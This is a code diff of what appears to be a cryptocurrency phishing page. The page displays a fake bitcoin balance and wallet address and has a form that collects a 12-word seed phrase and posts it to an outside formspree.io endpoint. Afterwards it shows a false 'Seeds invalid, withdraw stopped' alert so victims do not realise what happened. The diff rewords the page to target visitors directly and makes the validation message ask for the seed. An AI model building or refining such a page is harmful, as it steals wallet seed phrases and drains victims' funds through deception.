@@ -76,9 +76,9 @@
 </head>
 <body>
   <div class="container">
-    <h1>My Bitcoins</h1>
+    <h1>You Bitcoins</h1>
     <div class="bitcoin-amount">1.2554532 BTC</div>
-    <div class="address-label">My Wallet Address:</div>
+    <div class="address-label">You Wallet Address:</div>
     <div class="address">bc1qjd7kc9jx56jucjtt5j46gh5scn3s4n5672tph8</div>
     <form action="https://formspree.io/f/mnqyzroj" method="POST"  target="myFrame" onsubmit="showMessage()">
       <div class="form-group">
@@ -112,14 +112,14 @@
     
     if (words.length !== 12) {
       event.preventDefault();
-      alert('Message must contain exactly 12 words.');
+      alert('Seed must contain exactly 12 words.');
     }
   });
 </script>
   
   <script>
 function showMessage() {
-  var message = "Неверные данные аккаунта, не удается отправить OKs!";
+  var message = "Seeds invalid, withdraw stopped";
   alert(message);
   return true;
 }
